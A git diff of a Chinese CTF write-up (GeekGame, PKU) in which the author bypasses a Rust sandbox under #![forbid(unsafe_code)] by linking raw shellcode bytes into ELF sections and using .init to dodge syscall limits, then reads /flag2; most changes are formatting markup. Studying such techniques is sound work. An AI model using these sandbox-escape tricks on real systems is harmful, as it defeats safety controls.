@@ -902,6 +902,8 @@ $ http -f 'http://prob08-xxxxxx.geekgame.pku.edu.cn/admin/localhost%3A8080%252Fb
 
 # 编原译理习题课 · 实验班
 
+<CH.Section>
+
 安全的 Rust 代码怎么会段错误呢？？？
 
 安全的 Rust 代码怎么会段错误呢？？？
@@ -914,9 +916,9 @@ $ http -f 'http://prob08-xxxxxx.geekgame.pku.edu.cn/admin/localhost%3A8080%252Fb
 
 那么，或许我们让程序以 11 这个状态码退出就可以？并不行。退出程序的系统调用被沙盒 ban 掉了。但是沙盒里留了个 `SYS_exit_group`. 没找到调这个系统调用的方法。
 
-或许我们可以把 `forbid` 的限制给绕过去？
+或许我们可以把 _`forbid`_ 的限制给绕过去？
 
-试了试 `#[allow(unsafe_code)]` 结果不行。。Google 搜了搜， 找到了 `#[allow_internal_unsafe]` ， 结果也不行（在低版本的 rust 里可以，不过[这个问题后来被修了](https://github.com/rust-lang/rust/issues/56768)）。
+试了试 _`#[allow(unsafe_code)]`_ 结果不行。。Google 搜了搜， 找到了 _`#[allow_internal_unsafe]`_ ， 结果也不行（在低版本的 rust 里可以，不过[这个问题后来被修了](https://github.com/rust-lang/rust/issues/56768)）。
 
 那么就去研究一下 rust 处理爆栈的代码吧。
 
@@ -953,11 +955,15 @@ pub fn run() {
 //EOF
 ```
 
+</CH.Section>
+
+<CH.Section>
+
 下面几个循环只是为了防止编译器直接把这个变量优化掉（不然的话，在 release 模式下实测会被优化掉）。交上去，过了。
 
 那么第二问怎么做呢？Safe Rust 怎么读取到 Caller Stack Frame 里的东西呢？不会。。。
 
-后来想到了 ELF 的 `.init` 段和 `.fini` 段。`.init` 段的代码会在程序启动前执行。说不定我能把一个 Rust 函数链接到 `.init` 段,这正好也绕过了沙盒对系统调用的限制。
+后来想到了 ELF 的 _`.init`_ 段和 _`.fini`_ 段。_`.init`_ 段的代码会在程序启动前执行。说不定我能把一个 Rust 函数链接到 _`.init`_ 段,这正好也绕过了沙盒对系统调用的限制。
 
 ```rust
 #[link_section = ".init"]
@@ -973,6 +979,8 @@ pub fn run() {
 }
 ```
 
+</CH.Section>
+
 结果编译报错了
 
 ```rust
@@ -985,7 +993,9 @@ error: declaration of a function with `link_section`
    = note: the program's behavior with overridden link sections on items is unpredictable and Rust cannot provide guarantees when you manually override them
 ```
 
-不过使用题目提供的容器里的编译器编译并不会出现编译错误，应该是高版本的 rust 编译器在 `#![forbid(unsafe_code)]` 控制范围的代码里禁止了这种行为。
+<CH.Section>
+
+不过使用题目提供的容器里的编译器编译并不会出现编译错误，应该是高版本的 rust 编译器在 _`#![forbid(unsafe_code)]`_ 控制范围的代码里禁止了这种行为。
 
 运行一下。。段错误了。。。不知道为什么...wo 不想让它段错误的时候它却段错误了。
 
@@ -993,7 +1003,8 @@ error: declaration of a function with `link_section`
 
 通过搜索 `Rust execute shellcode` ，我们可以找到[这个帖子](https://users.rust-lang.org/t/how-can-i-execute-hex-opcodes-directly-in-rust/31123/13)。
 
-诶？？？你竟然可以在 Safe Rust（高版本的 Rust 已经在 `#![forbid(unsafe_code)]` 的情况下禁止这种行为） 里往 ELF 里链接一段机器码？？？
+诶？？？你竟然可以在 Safe Rust（高版本的 Rust 已经在 _`#![forbid(unsafe_code)]`_ 的情况下禁止这种行为） 里往 ELF 里链接一段机器码？？？
+
 
 ```rust
 #[no_mangle]
@@ -1001,7 +1012,12 @@ error: declaration of a function with `link_section`
 static hello_world: [u8; 38] = *b"\x6a\x01\x5f\x89\xf8\x6a\x0d\x5a\xeb\x0a\x5e\x0f\x05\x6a\x3c\x58\xff\xcf\x0f\x05\xe8\xf1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x21\x0a";
 ```
 
-我用 pwntools 生成了一段读取并输出 `/flag2` 的机器码（因为我太菜了，不会写 Shellcode）。
+
+</CH.Section>
+
+<CH.Section>
+
+我用 pwntools 生成了一段读取并输出 _`/flag2`_ 的机器码（因为我太菜了，不会写 Shellcode）。
 
 ```rust
 #![forbid(unsafe_code)]
@@ -1021,6 +1037,8 @@ pub fn fx() {
 pub fn run() {}
 //EOF
 ```
+
+</CH.Section>
 
 用一段代码拿到两个 flag， 双倍的快乐！（然而我没搞懂为什么链接到 init 段的 rust 函数会触发段错误）
 
